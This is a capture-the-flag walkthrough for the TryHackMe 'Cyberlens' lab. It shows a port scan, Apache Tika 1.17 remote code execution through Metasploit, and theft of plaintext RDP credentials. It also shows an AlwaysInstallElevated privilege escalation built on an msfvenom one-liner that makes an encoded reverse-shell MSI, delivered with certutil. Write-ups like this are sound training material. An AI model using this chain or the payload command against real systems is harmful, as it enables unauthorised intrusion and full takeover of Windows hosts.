-------------

### CTF: THM
### LAB: Cyberlens

--------------

![image](https://github.com/user-attachments/assets/a9dfa731-2fc9-4ee4-bd8b-2feed752f49f)

--------------


- Rustscan's output

```bash
❯ rustscan -a 10.10.13.13 -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.13.13:139
Open 10.10.13.13:135
Open 10.10.13.13:445
Open 10.10.13.13:3389
Open 10.10.13.13:5985
Open 10.10.13.13:7680
Open 10.10.13.13:47001
Open 10.10.13.13:49664
Open 10.10.13.13:49665
Open 10.10.13.13:49666
Open 10.10.13.13:49667
Open 10.10.13.13:49668
Open 10.10.13.13:49669
Open 10.10.13.13:49670
Open 10.10.13.13:49674
Open 10.10.13.13:61777
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 04:56 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:56
Completed Parallel DNS resolution of 1 host. at 04:56, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:56
Scanning 10.10.13.13 [16 ports]
Discovered open port 445/tcp on 10.10.13.13
Discovered open port 139/tcp on 10.10.13.13
Discovered open port 135/tcp on 10.10.13.13
Discovered open port 3389/tcp on 10.10.13.13
Discovered open port 49670/tcp on 10.10.13.13
Discovered open port 49665/tcp on 10.10.13.13
Discovered open port 49667/tcp on 10.10.13.13
Discovered open port 5985/tcp on 10.10.13.13
Discovered open port 49674/tcp on 10.10.13.13
Discovered open port 49668/tcp on 10.10.13.13
Discovered open port 49664/tcp on 10.10.13.13
Discovered open port 49666/tcp on 10.10.13.13
Discovered open port 47001/tcp on 10.10.13.13
Discovered open port 61777/tcp on 10.10.13.13
Discovered open port 49669/tcp on 10.10.13.13
Discovered open port 7680/tcp on 10.10.13.13
Completed Connect Scan at 04:56, 0.37s elapsed (16 total ports)
Initiating Service scan at 04:56
Scanning 16 services on 10.10.13.13
Service scan Timing: About 50.00% done; ETC: 04:58 (0:00:53 remaining)
Completed Service scan at 04:57, 57.08s elapsed (16 services on 1 host)
NSE: Script scanning 10.10.13.13.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 11.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 2.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 0.00s elapsed
Nmap scan report for 10.10.13.13
Host is up, received user-set (0.18s latency).
Scanned at 2024-12-06 04:56:17 WAT for 72s

PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-12-06T16:52:26+00:00; +12h54m57s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-06T16:52:13+00:00
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-05T16:49:28
| Not valid after:  2025-06-06T16:49:28
| MD5:   7eae:ac23:c002:9ab2:acb4:1df8:a3e3:cd22
| SHA-1: 62a1:548b:5e82:f693:d6c9:80c3:ce7c:1499:ec6d:94ce
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQST7kOJnmgbZK9dCvh9S6oDANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjQxMjA1MTY0OTI4WhcNMjUwNjA2MTY0
| OTI4WjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCl/+W1wIfcxL3qN1mAPe0Pgia9AvZSr4nClgMxXHekbvl/7Zbq
| NswodClgotMb4xJIf5ZfpEZwSIT8CnaQYcfFiKwj/jh/eHZBYyzBt8KRKJ19Eday
| tUEPPPA07Z9Mgx8dX6JY7K0v1qEbAufgkAY9dtR89sc06AnJ8eZ5anFc1R6p/zkw
| 67DoiNgmCAKHKxvxvSWoCe51qZN/tvIoVZ9F8PJCWBCi+61lS3m2y8rinbsxr/e+
| 8qQVdKp2jWmZhKxsueZXviEWkO+31nmIO+m7XGZuYMOWb3X9JrrDLOaQ+wdhsH/j
| JBcxL8VMHLoDE0lF0TZOZpMVR39rn+AhtdgxAgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAdnw81bEk
| o8xvqdqATo/etA1oZpArrqJnbAbU4vUZaKM3jrHrqQDkYxRS6p/D5UEsRR+/WVVf
| SLBZ58RHIKsI3aWqKQKcSfT/W5ybS5EatHxnHADgocJeXdyTYbGdWzqFK+sjMRGa
| Li58stL/iL3LiJshRqHgLkpcuObmTqy6gKuh5InB3IYL4P7wCM0vMQHp8/yWeXLj
| dp/VPVYxp1atSa1tpdFj0DK/2a0yg123kKUUiYneL83FbuRVes71Ye7MFE/qIrXP
| j2RykwiVbUYweX/5KlkbU1TpNeR63MHo5t+L/0vvZzgSMk/kYLBB9GdFnDdaZgf2
| 3EQfiI29ZOpsHg==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
61777/tcp open  http          syn-ack Jetty 8.y.z-SNAPSHOT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-cors: HEAD GET
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT
|_http-title: Welcome to the Apache Tika 1.17 Server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3196/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30333/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 2586/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36170/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-12-06T16:52:15
|_  start_date: N/A
|_clock-skew: mean: 12h54m56s, deviation: 0s, median: 12h54m56s
```

- The target is a window server.On port 61777,the server is hosting an `Apache Tika 1.17.0`.This version of Apache TIka is vulnerable to RCE as stated in [exploitdb](https://www.exploit-db.com/exploits/47208) and was able to get an exploit on metasploit.

![image](https://github.com/user-attachments/assets/66c8531d-48b0-4196-a15d-d99d2b69d018)

- I set the options as shown below.The reverse_shell module's  settings is the same as the stager settings.

![image](https://github.com/user-attachments/assets/b68f6bfc-6cc7-4cb6-b844-a191aa876a3d)

- Shell access

![image](https://github.com/user-attachments/assets/18783f0d-bf50-4c0f-bbd4-a354e9b769dd)

### Horizontal PrivEsc with exposed credentials

- I checked the user `CyberLens` folder `Documents\Management` and discovered a txt file containing rdp credntials for user `CyberLens`.

![image](https://github.com/user-attachments/assets/c60a53f5-d250-41ac-9df5-43bd1e6b8eff)

- RDP access with Remmina.

![image](https://github.com/user-attachments/assets/0451f8bf-5259-4ed1-8366-0da81b31591b)

### Privesc with Always Install Elevated

- I ran the registy query to check if AlwaysInstallElevated is set to 0x1.This means a user can install a Microsoft Windows package with adminstrative privileges.

Query-

```ps1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![image](https://github.com/user-attachments/assets/70a1b658-9f47-4fef-8361-70c0344324f1)

- I generated an msi payload with msfvenom with the ``one liner below.

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=80 --encoder x64/xor --iterations 9 --format msi --out wuzzwuzz.msi
```

![image](https://github.com/user-attachments/assets/a169f6ee-2a3a-438b-bef6-cb00ec42b042)

- I received it on the victim machine with `certutil.exe` and executed the msi executable.

![image](https://github.com/user-attachments/assets/da27b439-0788-47ed-be89-0eff7478ae21)

- Adminstrator shell

![image](https://github.com/user-attachments/assets/a418bfe9-ebbc-44a0-ad01-e1ff0a03b29e)

- Flags-:

![image](https://github.com/user-attachments/assets/80b050c4-d6c3-4e86-81e3-5e75d39587ef)

------------

### THANKS FOR READING

------------

### REFERENCES-:

------------

- [Apache Tika](https://www.exploit-db.com/exploits/47208)
- [AlwaysElevatedInstall](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path)

------------











